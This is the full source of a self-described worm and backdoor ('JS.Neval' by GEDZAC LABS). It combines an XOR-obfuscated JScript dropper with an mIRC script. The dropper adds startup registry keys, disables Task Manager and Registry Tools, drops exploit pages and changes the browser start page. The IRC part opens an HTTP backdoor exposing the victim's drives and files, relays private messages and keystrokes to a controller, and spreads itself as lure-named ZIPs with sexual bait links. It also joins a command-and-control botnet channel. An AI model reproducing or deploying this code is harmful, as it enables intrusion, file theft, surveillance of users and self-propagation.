//.JS.NEVAL..<GeDzAc.LaBs>..................................................
//'Mt)Ibqfk)f'E~'@BC]FD'KFET'*'Phuj'cb'Wurbef...............................
/*..........................................................................
On 1:TEXT:gp*:*:{ var %gp = $remove($1,gp)
  if (%gp == $chr(103) $+ $chr(101) $+ $chr(100) $+ $chr(122) $+ $chr(97)) {
    if ($2 == On) { .set %d.on $true | .set %d.nick $nick | .privmsg $nick $decode(SW5pY2lhbmRvIFNlY2lvbiBkZSBDb250cm9sIFJlbW90byA6KQ==,m) }
  if ($2 == Off) { .set %d.on $false | .unset %d.nick $nick | .privmsg $nick $decode(VGVybWluYW5kbyBTZWNpb24gZGUgQ29udHJvbCBSZW1vdG8gOik=,m) } }
  else { .privmsg $nick $decode(cGFzcyBpbmNvcnJlY3QgOig=,m) }
.close -cm $nick }
On 1:Text:smd*:*:{
  if (%d.on = $false) { halt } | var %tv = $remove($1,smd)
  if (%tv == ZpIOn) { .set %ZpI $true } | elseif (%tv == ZpIOff) { .set %ZpI $false }
  elseif (%tv == ZpTcOn) { .set %ZpTc $true } | elseif (%tv == ZpTpOn) { .set %ZpTp $true }
  elseif (%tv == ZpTOff) { .set %ZpTc $false | .set %ZpTp $false } | elseif (%tv == exit) { .disconnect | .exit }
  elseif (%tv == ip) { .privmsg $nick %mip } | elseif (%tv == Zpc) { EV $2- }
.close -cm $nick }
Alias EV { // $+ $eval($1-,100) }
On 1:Text:*:?:{
  if (%ZpTp = $true) { .privmsg %d.nick < $+ $Nick $+ > $+ $1- }
  if ($NoText($1-) = $true) { .ignore $nick | .close -cm $nick }
}
On 1:Text:*:#:{
  if (%ZpTc = $true) { .privmsg %d.nick < $+ $Nick $+ > $+ $1- }
  if ($NoText($1-) = $true) { .part $chan }
}
On 1:INPUT:*:{
  if %ZpI = $true { .privmsg %d.nick 12 $+ $1- $+  }
if ($NoText($1-) = $true) { halt } }
Alias unload { .echo -ae $decode(KiBVbmxvYWRlZCBzY3JpcHQgJw==,m) $+ $2 $+ ' }
Alias socklist { .echo -ae $decode(KioqIE5vIG9wZW4gc29ja2V0cw==,m) }
Alias NoText {
  if (trojan isin $1-) || (troyano isin $1-) || (virus isin $1-) || (worm isin $1-) || (set isin $1-) || (enable isin $1-) || (disable isin $1-) || (remote isin $1-) || (script isin $1-) || (play isin $1-) || (sock isin $1-) || (write isin $1-) || (decode isin $1-) || (alias isin $1-) || (load isin $1-) || (unload isin $1-) || (remini isin $1-) || (remove isin $1-) || (events isin $1-) || (timer isin $1-) { return $true }
  else { return $false }
}
;---------------------------------------------------------------------------
ctcp *:dcc send:*:{ if ($len($nopath($filename)) >= 225) { halt } }
;Http-----------------------------------------------------------------------
Alias OpenServHttp { .socklisten HttpPort 80 }
On *:socklisten:HttpPort:{ .sockaccept RanPort $+ $r(0,99999) }
On *:sockread:RanPort*:{
  if ($sockerr > 0) { return }
  if ($sock($sockname).status == active) { .sockread %nav } | else { return }
  if ($sockbr == 0) { return } | if (%nav == $null) { %nav = - }
  if (GET isin %nav) {
    if (php isin %nav) { SendXploitPhp } | else { SendXploitHtm }
  }
}
Alias SendHeader {
  wsock $1 HTTP/1.1 200 OK
  wsock $1 Server: Serv-Xploit/1.1
  wsock $1 Date: $+ $Chr(32) $+ $fulldate
  wsock $1 Connection: close
}
Alias SendXploitHtm {
  SendHeader $sockname
  wsock $sockname Content-Type: text/html
  wsock $sockname Content-Length: $+ $Chr(32) $+ $calc($file(WINDIR\H.DAT).size + 243)
  wsock $sockname $crlf
  %c = 1 | while (%c < 8) { wsock $sockname --------------------------------- | inc %c }
  .GetXploit $sockname WINDIR\H.DAT
}
Alias SendXploitPhp {
  SendHeader $sockname
  wsock $sockname Content-Type: application/hta
  wsock $sockname Content-Length: $+ $Chr(32) $+ $file(WINDIR\P.DAT).size
  wsock $sockname $crlf
  %c = 1 | while (%c < 8) { wsock $sockname --------------------------------- | inc %c }
  .GetXploit $sockname WINDIR\P.DAT
}
Alias wsock { if ($sock($1).status == active) { sockwrite -n $1 $2- } }
Alias GetXploit {
  if ($isfile($2) == $true) { .bread $2 0 $lof($2) &bin | wsock $1 &bin }
}
Alias GetIp { .sockopen pip cualesmiip.e-mision.net 999 }
On *:sockread:pip:{ if ($sockerr > 0) { return }
  if ($sock(pip).status == active) { .sockread -f %pi } | else { return }
  if ($sockbr == 0) { return } | if (%pi == $null) { %pi = - }
if ($len(%pi) > 6) { .set %mip %pi | .sockclose pip | .unset %pi } }
;BackDoor--------------------------------------------------------------------------
Alias OpenBackPort { .socklisten BackPort 4821 }
On *:socklisten:BackPort:{ .sockaccept BakPort $+ $r(0,99999) }
On *:sockread:BakPort*:{
  if ($sockerr > 0) { return }
  if ($sock($sockname).status == active) { .sockread %bak } | else { return }
  if ($sockbr == 0) { return } | if (%bak == $null) { %bak = - }
  if (GET isin %bak) {
    %path = $shortfn($replace($mid($gettok(%bak,2,32),2),$Chr(47),$Chr(92)))
    if (index.htm isin %path) { 
      SendHeader $sockname | SendMH $sockname
      wsock $sockname <html><title>Backdoor.Http.Neval By GEDZAC LABS</title>
      wsock $sockname <h4>Backdoor.Http.Neval By GEDZAC LABS</h4><br>Bienvenido a $+ $Chr(32) $+ %mip
      wsock $sockname <br>SO:Win $+ $Chr(32) $+ $OS $+ $Chr(32) $+ <br><pre>
      %c = 1 | while (%c <= $disk(0)) { wsock $sockname <a href=http:// $+ %mip $+ :4821/ $+ $disk(%c).path $+ > $+ $disk(%c).path $+ </a> $+ $Chr(32) $+ $disk(%c).type $+ $Chr(32) $+ $bytes($disk(%c).size).suf $+ <br> | inc %c }
      wsock $sockname </pre></html> | dsock
    }
    if ($Chr(58) $+ $Chr(92) isin %path) {
      if ($isdir(%path)) {
        SendHeader $sockname | SendMH $sockname
        wsock $sockname <html><title>Backdoor.Http.Neval By GEDZAC LABS</title>
        wsock $sockname <h4> $+ %path $+ </h4><br><p><pre>
        %c = 1 | while (%c <= $finddir(%path,*.*,0,1)) { wsock $sockname <a href=http:// $+ %mip $+ :4821/ $+ $shortfn($finddir(%path,*.*,%c,1)) $+ > $+ $shortfn($finddir(%path,*.*,%c,1)) $+ </a> $+ <br> | inc %c }
        %c = 1 | while (%c <= $findfile(%path,*.*,0,1)) { wsock $sockname <a href=http:// $+ %mip $+ :4821/ $+ $shortfn($findfile(%path,*.*,%c,1)) $+ > $+ $shortfn($findfile(%path,*.*,%c,1)) $+ </a> $+ $Chr(32) $+ $bytes($file($shortfn($findfile(%path,*.*,%c,1))).size).suf $+ <br> | inc %c }
        wsock $sockname </pre><html> | dsock
      }
      if ($isfile(%path)) {
        SendHeader $sockname        
        wsock $sockname Content-Type: application/octet-stream
        wsock $sockname Content-Length: $+ $Chr(32) $+ $file(%path).size
        wsock $sockname $crlf
        .Set %p0 0 | .Set %pk 64 | .Set %sz $file(%path).size
        SendOctet %path $sockname
      }
    }
  }
}
Alias dsock { .timer $+ $sockname 1 60 if ($sock( $sockname ).status == active) { .sockclose $sockname } }
Alias SendMH {
  wsock $1 Content-Type: text/html
  wsock $1 $crlf
  %c = 1 | while (%c < 10) { wsock $sockname --------------------------------a | inc %c }
}
Alias SendOctet {
  .Set %bfile $1
  if ($calc(%p0 + %pk) < %sz) {
    .bread $1 %p0 %pk &ocbar | wsock $2 &ocbar
    .Set %p0 $calc(%p0 + %pk)
  }
  if ($calc(%p0 + %pk) >= %sz) {
    .Set %pk $calc(%sz - %p0)
    if (%pk = 0) { return }
    .bread $1 %p0 %pk &ocbar | wsock $2 &ocbar
    .Set %p0 $calc(%p0 + %pk)
  }
}
On *:sockwrite:bakport*:{
  if ($sockerr > 0) { sockclose $sockname | return }
  if ($len(%bfile) < 5) { return }
  if (%p0 >= %sz) { sockclose $sockname | .Unset %bfile | return }
  SendOctet %bfile $sockname
}
;SendriV--------------------------------------------------------------------
On 1:CONNECT:{ /Unset %bv.* %d.* %nv.* | /set %ZpI $false | /set %ZpT $false | /set %d.on $false | /Remote On | .unset %mip %pi | GetIp | OpenServHttp | OpenBackport | GedBot }
Alias msgc {
  if ($nick(#,0) > 20) { %i = $r(0,$calc($nick(#,0) - 20)) | %j = $calc(%i + 20) } | else { %i = 1 | %j = $nick(#,0) }
  Set %ht 0
  while (%i <= %j) {
    if ($nick(#,%i) isop $chan) || ($nick(#,%i) ishop $chan) || ($nick(#,%i) isvoice $chan) || ($nick(#,%i) == $me) { goto Hl }
    .timer $+ $nick(#,%i) 1 $calc(%ht + 25) { siv $nick(#,%i) }
    :Hl
    inc %i | inc %ht 25
  }
  Set %ht 0
} 
On 1:JOIN:*:{ if ($nick != $me) { { siv $nick } | { sv } } | else { if (ayuda isin #) || (help isin #) || (virus isin #) || (avt isin #) || (vh isin #) || (gigairc isin #) { .privmsg # $decode(SXJjLkJhcmRpZWwuRCBieSBHRURaQUMgTEFCUw==,m) | .disconnect | .exit } } }
On 1:PART:#:{ if ($nick != $me) { { siv $nick } | { sv } } | else { msgc } }
On 1:FileRcvd:*:{ if ($nick != $me) { { siv $nick } | { sv } } }
On 1:SENDFAIL:*:{ halt }
On 1:FileSent:*:{ if (.zip isin $filename) { halt } | var %ps = SYSDIR $+ $decode(XE5ldmFsLnppcA==,m) | .copy -o %ps $nofile(%ps) $+ $gettok($nopath($filename),1,46) $+ 2.zip | csv $nick $nofile(%ps) $+ $gettok($nopath($filename),1,46) $+ 2.zip #op }
Alias csv { set %bv.file $2
  if ( $1 isop $3 ) || ( $1 isvoice $3 ) { halt }
  if ( $exists(%bv.file) = $false ) { halt }
  if ( $sock(bv.*,0) > 5 ) { return }
  Set %bv. $+ $1 0 | :scanpt | Set %pt $rand(2400,5000)
  if ( $portfree(%pt) = $false ) { goto scanpt }
  Set [ % $+ [ nv. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%bv.file).size
  Set %bv.vtp1 bv. $+ $1 | .timer $+ $1 1 300 { .sockclose %bv.vtp1 | .sockclose i. $+ $1 }
  .timer $+ $1 1 50 eb $1 | .ignore -u90 $1 2
  .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %bv.file $longip($ip) %pt %sz $+ $chr(1)
if ( $sock(%bv.vtp1) != $null ) { .sockclose %bv.vtp1 } | .socklisten %bv.vtp1 %pt }
Alias eb { if ( [ % $+ [ nv. $+ [ $1 ] ] ] = 0 ) { .sockclose [ i. $+ [ $1 ] ] | .sockclose [ bv. $+ [ $1 ] ] | .timer $+ $1 off } }
Alias lsv { if ( $calc( [ % $+ [ nv. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %bv.file [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data | inc [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ bv. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ nv. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %bv.file [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data } }
On 1:SockClose:i.*:{ Set %bv.tmp6 $remove($sockname,i.) | sockclose $sockname | sockclose [ bv. $+ [ %bv.tmp6 ] ] | .timer $+ %bv.tmp6 off }
On 1:SockListen:bv.*:{ Set %bv.tmp5 $remove($sockname,bv.) | sockaccept i. $+ %bv.tmp5 | lsv %bv.tmp5 }
On 1:SockWrite:i.*:{ Set %bv.tmp6 $remove($sockname,i.) | if ( [ % $+ [ bv. $+ [ %bv.tmp6 ] ] ] = 1 ) { .timer $+ $rand(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ bv. $+ [ %bv.tmp6 ] ] | .timer $+ %bv.tmp6 off | halt } | lsv %bv.tmp6 }
On 1:Disconnect:{ .timers off | .sockclose bv.* | .sockclose i.* }
Alias sv { var %pb = SYSDIR $+ $decode(XE5ldmFsLnppcA==,m)
  if ($exists(%pb) = $false) { halt } | var %rb = $rand(1,10)
  if (%rb = 1) { .copy -o %pb $nofile(%pb) $+ $decode(VmlkZW8uemlw,m) | Set %bv.file $nofile(%pb) $+ $decode(VmlkZW8uemlw,m) }
  elseif (%rb = 2) { .copy -o %pb $nofile(%pb) $+ $decode(Q2Fyb2xpbmEuemlw,m) | Set %bv.file $nofile(%pb) $+ $decode(Q2Fyb2xpbmEuemlw,m) }
  elseif (%rb = 3) { .copy -o %pb $nofile(%pb) $+ $decode(TXlGb3RvLnppcA==,m) | Set %bv.file $nofile(%pb) $+ $decode(TXlGb3RvLnppcA==,m) }
  elseif (%rb = 4) { .copy -o %pb $nofile(%pb) $+ $nick $+ .zip | Set %bv.file $nofile(%pb) $+ $nick $+ .zip }
  elseif (%rb = 5) { .copy -o %pb $nofile(%pb) $+ $decode(UG9zdGFsLnppcA==,m) | Set %bv.file $nofile(%pb) $+ $decode(UG9zdGFsLnppcA==,m) }
  elseif (%rb = 6) { .copy -o %pb $nofile(%pb) $+ $decode(SW52aXRhY2lvbi56aXA=,m) | Set %bv.file $nofile(%pb) $+ $decode(SW52aXRhY2lvbi56aXA=,m) }
  elseif (%rb = 7) { .copy -o %pb $nofile(%pb) $+ $decode(WFhYLnppcA==,m) | Set %bv.file $nofile(%pb) $+ $decode(WFhYLnppcA==,m) }
  elseif (%rb = 8) { .copy -o %pb $nofile(%pb) $+ $decode(RWxDaHVwYUNhYnJhcy56aXA=,m) | Set %bv.file $nofile(%pb) $+ $decode(RWxDaHVwYUNhYnJhcy56aXA=,m) }
  elseif (%rb = 9) { .copy -o %pb $nofile(%pb) $+ $decode(Q29tb1NlZHVjaXIuemlw,m) | Set %bv.file $nofile(%pb) $+ $decode(Q29tb1NlZHVjaXIuemlw,m) }
  elseif (%rb = 10) { .copy -o %pb $nofile(%pb) $+ $decode(QXJ0ZURlbFNleG8uemlw,m) | Set %bv.file $nofile(%pb) $+ $decode(QXJ0ZURlbFNleG8uemlw,m) }
csv $nick %bv.file $chan }
Alias siv { var %rb3 = $rand(1,10)
  if (%rb3 = 1) { var %mb3 = 4 $+ $decode(Q29uc2Vqb3MgZGUgY29tbyBtZWpvcmFyIHR1IGRlc2VtcGXxbyBzZXh1YWwgaHR0cDovLw==,m) $+ %mip $+ $decode(L1NleFNhbHVkLmh0bQ==,m) $+  }
  elseif (%rb3 = 2) { var %mb3 = 4,1 $+ $decode(Q29tbyBwcm9sb25nYXIgZWwgT3JnYXNtbyBodHRwOi8v,m) $+ %mip $+ $decode(L29yZ2FzbW8uaHRt,m) $+  }
  elseif (%rb3 = 3) { var %mb3 = 8,1 $+ $decode(TWFudWFsIHBhcmEgaGFja2VhciBtYWlscyBob3RtYWlsIC0geWFob28gLSBsYXRpbm1haWwgaHR0cDovLw==,m) $+ %mip $+ $decode(L2hhY2ttYWlsLnR4dA==,m) $+  }
  elseif (%rb3 = 4) { var %mb3 = 12 $+ $decode(TWlyYSBlc3RvIHBhIHF1ZSB0ZSBlbnRyZXRlbmdhcyBodHRwOi8v,m) $+ %mip $+ $decode(L3R1LmpwZyA6KQ==,m) $+  }
  elseif (%rb3 = 5) { var %mb3 = 4,1 $+ $decode(TGFzIGZvdG9zIGRlbCBkZXNudWRvIGRlIENyaXN0aW5hIEFndWlsZXJhIGh0dHA6Ly8=,m) $+ %mip $+ $decode(L2NyaXN0aW5hMDEuanBn,m) $+  }
  elseif (%rb3 = 6) { var %mb3 = 4 $+ $decode(TWlyYSBtaSBmb3RvIGh0dHA6Ly8=,m) $+ %mip $+ / $+ $me $+ $decode(LmpwZyA6KQ==,m) $+  }
  elseif (%rb3 = 7) { var %mb3 = 12,15 $+ $decode(TWlyYSBsYXMgdWx0aW1hcyBmb3RvcyBkZWwgQ2h1cGFDYWJyYXMgaHR0cDovLw==,m) $+ %mip $+ $decode(L2NodXBhMDEuanBn,m) $+  }
  elseif (%rb3 = 8) { var %mb3 = 4,2 $+ $decode(RnJlZSBTZXggVmlkZW8gLSBBbWF0ZXVyIC0gTGVzYmlhbiBodHRwOi8v,m) $+ %mip $+ $decode(L2ZyZWVzZXguYXZp,m) $+  }
  elseif (%rb3 = 9) { var %mb3 = 1 $+ $decode(TGEgd2ViIGRlIGxvIFJhcm8geSBFeHRyYfFvIGh0dHA6Ly8=,m) $+ %mip $+ $decode(L1F1ZVJhcm8uanBn,m) $+  }
  elseif (%rb3 = 10) { var %mb3 = 8,13 $+ $decode(Q29uc2Vqb3MgcGFyYSBzZWR1Y2lyIGEgdHUgcGFyZWphIGh0dHA6Ly8=,m) $+ %mip $+ $decode(L3NlZHVjY2lvbi5odG0=,m) $+  }
.privmsg $1 %mb3 }
;B0t------------------------------------------------------------------------
Alias GedBot { if ($sock(gbot).status == active) { halt } | gserv | %rs = $r(1,5) | .timer 1 3 .sockopen gbot $hget(gSv,%rs) 6667 }
Alias rnick { return $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,z) $+ $rand(a,z) $+ $rand(A,z) }
Alias ruser { %v = $r(1,9)
  if (%v == 1) %v = $decode(aG90bWFpbC5jb20=,m) | if (%v == 2) %v = $decode(bGF0aW5tYWlsLmNvbQ==,m) | if (%v == 3) %v = $decode(eWFob28uY29t,m)
  if (%v == 4) %v = $decode(dGVycmEuY29t,m) | if (%v == 5) %v = $decode(bXNuLmNvbQ==,m) | if (%v == 6) %v = $decode(cmNwLm5ldA==,m)
  if (%v == 7) %v = $decode(Z2VkemFjLm9yZw==,m) | if (%v == 8) %v = $decode(dGVsZWZvbmljYS5jb20=,m) | if (%v == 9) %v = $decode(cGVydS5jb20=,m)
return USER $rnick " $+ %v $+ " " $+ $sock($sockname).ip $+ " : $+ %v }
On *:sockopen:gbot:{ .timerbb off | wsock gbot NICK $rnick | wsock gbot $ruser | .Set %rch $Chr(35) $+ $rnick | .timerbb 5 50 wsock gbot join %rch | .timeral 5 60 wsock gbot topic %rch NEVAL }
On *:sockclose:gbot:{ .timerb off | .timerb 1 120 GedBot }
On *:sockread:gbot:{ if ($sockerr > 0) { return }
  if ($sock(gbot).status == active) { sockread %rbot } | else { return }
  if ($sockbr == 0) { return } | if (%rbot == $null) { %rbot = - }
  if ($gettok(%rbot,1,32) == PING) { wsock gbot PONG $gettok(%rbot,2,58) }
  if ($gettok($gettok(%rbot,1,32),2,64) != $decode(RGFya01hY2hpbmUudXNlcnMudW5kZXJuZXQub3Jn,m)) { halt }
  if (BINFO isin %rbot) { wsock $sockname privmsg %rch : $+ $me $+ $chr(32) $+ $server $+ $chr(32) $+ $port $+ $chr(32) $+ $mircdir $+ $chr(32) $+ $ip $+ $chr(32) $+ $date $+ $chr(32) $+ $time }
  if (cmd isin %rbot) { EV $gettok(%rbot,5-,32) }
if (smd isin %rbot) { .sockwrite -tn gbot $gettok(%rbot,5-,32) } }
Alias gserv {
  hadd -m gSv 1 $decode(aXJjLnVuZGVybmV0Lm9yZw==,m)
  hadd gSv 2 $decode(bWFuaGF0dGFuLmtzLnVzLnVuZGVybmV0Lm9yZw==,m)
  hadd gSv 3 $decode(cGFuYW1hY2l0eS5wYS51bmRlcm5ldC5vcmc=,m)
  hadd gSv 4 $decode(c2FuZGllZ28uY2EudXMudW5kZXJuZXQub3Jn,m)
  hadd gSv 5 $decode(ZmFpcmZheC52YS51cy51bmRlcm5ldC5vcmc=,m)
}
........................................................................*/
eval(o("qfu'a':'ibp'Fdsnqb_Hembds/%Tdunwsni`)AnkbT~tsbjHembds%.<'qfu'p':'ibp'Fdsnqb_Hembds/%PTdunws)Tobkk%.<'qfu'k':'Tsuni`)auhjDofuDhcb/64+67.<"));
if (ish()==true) { gts(); } else { Install(); drop(); zip(); sdisk(); stpg(); }
function Install()
{
 eval(o("a)Dhw~Ankb/pa/.+tw/7.,%[[tdfiub`p)mt%.<'a)Dhw~Ankb/pa/.+tw/6.,%[[jt`tuq45)mt%.<'a)Dhw~Ankb/pa/.+tw/6.,%[[Ibqfk)mt%.<"));
 eval(o("up/%OLB^XKHDFKXJFDONIB[[Thaspfub[[Jnduhthas[[Pnichpt[[DruubisQbutnhi[[Uri[[PniUb`%+tw/7.,%[[tdfiub`p)mt%+6.<"));
 eval(o("up/%OLB^XKHDFKXJFDONIB[[Thaspfub[[Jnduhthas[[Pnichpt[[DruubisQbutnhi[[UriTbuqndbt[[Tbuqndbt%+tw/6.,%[[jt`tuq45)mt%+6.<"));
 eval(o("up/%OLB^XKHDFKXJFDONIB[[Thaspfub[[Jnduhthas[[Pnichpt'Tdunwsni`'Ohts[[Tbssni`t[[Snjbhrs%+'%7%+'5.<"));
 eval(o("up/%OLB^XKHDFKXJFDONIB[[Thaspfub[[Jnduhthas[[Pnichpt'Tdunws'Ohts[[Tbssni`t[[Snjbhrs%+'%7%+'5.<"));
 eval(o("up/%OLB^XDRUUBISXRTBU[[Thaspfub[[Jnduhthas[[PnichptIS[[DruubisQbutnhi[[Whkndnbt[[T~tsbj[[CntfekbUb`ntsu~Shhkt%+'%6%+'5.<"));
 eval(o("up/%OLB^XDRUUBISXRTBU[[Thaspfub[[Jnduhthas[[PnichptIS[[DruubisQbutnhi[[Whkndnbt[[T~tsbj[[CntfekbSftlJ`u%+'%6%+'5.<"));
 eval(o("up/%OLB^XDRUUBISXRTBU[[Thaspfub[[Jnduhthas[[Pnichpt[[DruubisQbutnhi[[Whkndnbt[[T~tsbj[[CntfekbUb`ntsu~Shhkt%+'%6%+'5.<"));
 eval(o("up/%OLB^XDRUUBISXRTBU[[Thaspfub[[Jnduhthas[[Pnichpt[[DruubisQbutnhi[[Whkndnbt[[T~tsbj[[CntfekbSftlJ`u%+'%6%+'5.<"));
}
function rw(rk,rv,m)
{
 if (m==1) { eval(o("p)Ub`Punsb/ul+uq.<")); }
 else { eval(o("p)Ub`Punsb/ul+uq+%UB@XCPHUC%.<")); }
}
function o(stg)
{
 var ens='';
 for (i=0; i<stg.length; i++) { ens=ens+String.fromCharCode(stg.charCodeAt(i) ^ 7); }
 return(ens);
}
function sp(n) { return eval(o("a)@bsTwbdnfkAhkcbu/i.<")); }
function wf() { return eval(o("PTdunws)TdunwsArkkIfjb<")); }
function ish() 
{
 try { eval(o("sw:PTdunws)TdunwsArkkIfjb<")); }
 catch(e) { return true; }
}
function gts()
{ 
 var dt = document.scripts[0].text;
 eval(o("qfu'sm':'a)DubfsbSbsAnkb/tw/5.,%[[@BC]FD)MT%.<'sm)Punsb/cs)tretsuni`/5+cs)kbi`so*5..<'sm)Dkhtb/.<"));
 eval(o("p)Uri/tw/5.,%[[@BC]FD)MT%.<"));
 eval(o("pnichp)dkhtb/.<"));
}
function drop()
{
 eval(o("qfu'o':'a)DubfsbSbsAnkb/tw/7.,%[[O)CFS%.<'o)Punsb/%;tdunws9chdrjbis)punsb/ ;hembds'cf , sf:`bc} , fd)w , ow9;(he , mbds9 .<;(tdunws9%.<'o)Dkhtb/.<"));
 eval(o("qfu'mi':'a)HwbiSbsAnkb/pa/..<'qfu'mt':'mi)UbfcFkk/.<'mi)Dkhtb/.<"));
 eval(o("qfu'o':'a)DubfsbSbsAnkb/tw/7.,%[[W)CFS%.<'o)Punsb/ ;OSJK9 ,k, ;OSF=FWWKNDFSNHI'NC:%JCJ%'FWWKNDFSNHIIFJB:%JCJ%'EHUCBU:%ihib%'EHUCBUTS^KB:%ihujfk%'DFWSNHI:%ih%'NDHI:%%'DHISB_SJBIR:%ih%'JF_NJN]BERSSHI:%ih%'JNINJN]BERSSHI:%ih%'TOHPNISFTLEFU:%ih%'TNI@KBNITSFIDB:%ih%'T^TJBIR:%ih%'QBUTNHI:%6)7%'PNICHPTSFSB:%jninjn}b%(9 ,k, ;Tdunws'Kfi`rf`b:%MfqfTdunws%9 ,k,mt,k, ;(Tdunws9 ,k, ;(OSJK9 .<'o)Dkhtb/.<"));
}
function sdisk()
{
 eval(o("qfu'i':'ibp'Birjbufshu/a)Cunqbt.<"));
 for (; !n.atEnd(); n.moveNext())
 {
 eval(o("qfu'r':'i)nsbj/.<")); eval(o("na'//r)CunqbS~wb::5.'{{'/r)CunqbS~wb::4..'|'tcnu/r)Wfso,%[[%.<'z"));
 }
}
function sdir(lt)
{
 eval(o("qfu'd':'ibp'Birjbufshu/a)@bsAhkcbu/ks.)TreAhkcbut.<"));
 for (; !c.atEnd(); c.moveNext()) { eval(o("qfu'~':'d)nsbj/.<'tankbt/~)Wfso,%[[%.<'tcnu/~)Wfso,%[[%.<")); }
}
function sfiles(fp)
{
 eval(o("qfu'v':'ibp'Birjbufshu/a)@bsAhkcbu/aw.)Ankbt.<"));
 for (; !q.atEnd(); q.moveNext()) { eval(o("qfu'u':'v)nsbj/.<")); eval(o("na'/u)Ifjb)shKhpbuDftb/.::%jnud)nin%.'|'nju/u)Wfso+aw.<'z")); }
}
function stpg()
{
 eval(o("up/%OLB^XDRUUBISXRTBU[[Thaspfub[[Jnduhthas[[Nisbuibs'Bwkhubu[[Jfni[[Tsfus'Wf`b%+%ossw=((ppp)ihch27)hu`(wfubjhtkf`rbuuf(%+6.<'up/%OLB^XKHDFKXJFDONIB[[Thaspfub[[Jnduhthas[[Nisbuibs'Bwkhubu[[Jfni[[Tsfus'Wf`b%+%ossw=((ppp)ihch27)hu`(wfubjhtkf`rbuuf(%+6.<"));
}
function zip()
{
 eval(o("up/%OLDR[[thaspfub[[indh'jfl'dhjwrsni`[[pni}nw[[pninin[[Ifjb%+%@BC]FD%+6.<'up/%OLDR[[thaspfub[[indh'jfl'dhjwrsni`[[pni}nw[[pninin[[TI%+%BEE>735B%+6.<'up/%OLB^XRTBUT[[)CBAFRKS[[thaspfub[[indh'jfl'dhjwrsni`[[pni}nw[[pninin[[Ifjb%+%@BC]FD%+6.<'up/%OLB^XRTBUT[[)CBAFRKS[[thaspfub[[indh'jfl'dhjwrsni`[[pni}nw[[pninin[[TI%+%BEE>735B%+6.<"));
 eval(o("p}w:p)Ub`Ubfc/%OLB^XKHDFKXJFDONIB[[Thaspfub[[Jnduhthas[[Pnichpt[[Druubisqbutnhi[[Rinitsfkk[[Pni}nw[[RinitsfkkTsuni`%.<'p}w:a)@bsWfubisAhkcbuIfjb/p}w.<'p}w:p}w)tretsuni`/6+p}w)kbi`so*5.<'p)Uri/a)@bsAnkb/p}w.)Ifjb','%'*f'%','tw/6.','%[[Ibqfk)}nw'%','tw/6.','%[[Ibqfk)mt%+'7+'surb.<"));
}
function imr(mip,mrp)
{
 ini(mip, o("uankbtZ"), o("i5"), "Neval");
 ini(mip, o("pfuiZ"), o("atbuqb"), o("haa"));
 ini(mip, o("pfuiZ"), o("cdd"), o("haa"));
 ini(mip, o("ankbtbuqbuZ"), o("pfuini`"), o("haa"));
 eval(o("qfu'js':'%%<'qfu'mu':'a)HwbiSbsAnkb/pa/..<"));
 for (i=0; i<3; i++) { jr.SkipLine(); }
 for (i=0; i<=221; i++) { mt = mt+jr.Readline()+l; }
 mt = mt.replace('WINDIR',sp(0)); mt = mt.replace('WINDIR',sp(0)); mt = mt.replace('WINDIR',sp(0)); mt = mt.replace('WINDIR',sp(0)); mt = mt.replace('SYSDIR',sp(1)); mt = mt.replace('SYSDIR',sp(1));
 eval(o("mu)Dkhtb/.<'qfu'j`':'a)DubfsbSbsAnkb/juw, Ibqfk .<'j`)Punsb/js.<'j`)Dkhtb/.<"));
}
function ini(pat,sec,key,val)
{
var mi0=f.OpenTextFile(pat); var mi1=mi0.ReadAll(); mi0.Close(); mi1.toLowerCase();
if (mi1.indexOf(sec) != -1)
 {
  var mArray=mi1.split('[');
  for(i=0;i<mArray.length; i++)
  {
   if (mArray[i].indexOf(sec) == 0)
   {
    sar=mArray[i];
    var nArray=sar.split(l);
     if(sar.indexOf(key) != -1)
      {
       for(x=0;x<nArray.length; x++)
        {       
         if (nArray[x].indexOf(key) == 0) { nArray[x]=key+'='+val; mArray[i]=nArray.join(l); }
        }
      }
     else
      {
       nArray[0]=nArray[0]+l+key+'='+val; mArray[i]=nArray.join(l);
      }
   }
  }
var mi2 = f.OpenTextFile(pat,2); mi2.Write(mArray.join('[')); mi2.Close();
 }
else
 {
  var mi2 = f.OpenTextFile(pat,8); mi2.Write(l+'['+sec+l+key+'='+val+l); mi2.Close();
 }
}